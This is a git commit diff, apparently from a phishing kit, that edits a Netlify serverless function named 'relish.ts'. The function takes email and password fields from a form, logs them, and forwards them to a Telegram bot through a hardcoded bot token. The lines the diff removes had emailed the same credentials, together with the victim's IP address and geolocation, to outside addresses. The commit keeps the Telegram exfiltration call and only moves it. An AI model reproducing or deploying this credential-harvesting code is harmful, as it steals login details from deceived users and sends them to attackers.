e38f6e1f2f58a1778dba678587d81568c392348e
wirthschwind <139864045+wirthschwind@users.noreply.github.com>
2024-12-15 07:28:35 -0800

    Update relish.ts

--- netlify/functions/relish.ts
+++ netlify/functions/relish.ts
@@ -7,7 +7,6 @@ export default async (req: Request, context: Context) => {
   const email = body.get("ai");
   const password = body.get("pr");
   console.log('response:', {email, password});
-  await sendToTG(email, password);
 
 async function sendToTG(e, p) {
         const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
@@ -42,53 +41,7 @@ async function sendToTG(e, p) {
     .catch((error) => console.error("Error:", error));
 };
 
-    
-async function getLoc(){
-        await fetch('https://hutils.loxal.net/whois').then(response => response.json()).then(data => {
-        loc = JSON.stringify(data, null, 2);
-      });
-        return;
-};
-
-
-
-  const message = {
-      from: "muammer_y@hotmail.com",
-      to: "emilychan1178@gmail.com",
-      subject: "New result",
-      text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
-      html: `<div>
-            <b>Login information:</b><br/>
-            Email:: ${email} <br/>
-            Password:: ${password} <br/><br/>
-            <b>Geolocation:</b><br/>
-            IP:: ${context.ip} <br/>
-            City:: ${context?.geo?.city} <br/>
-            Country:: ${Object.values(context?.geo?.country)} <br/>
-            Timezone:: ${context?.geo?.timezone} <br/>
-            </div>`,
-    };
-
-  switch(req?.method){
-    case "POST":
-      try{
-         const sendy = await transporter.sendMail(message, (err) => {
-           console.log(err);
-         });
-         console.log(sendy)
-         response = new Response(JSON.stringify({email, password, context}))
-      }
-      catch(error){
-        console.log(errror)
-      };
-      break;
-    case "GET":
-      response = new Response("Get method")
-      break;
-    default:
-      response  = new Response("Default");
-      break;
-  }
-  return response;
+console.log('E-O-L');
+await sendToTG(email, password);
 }
 
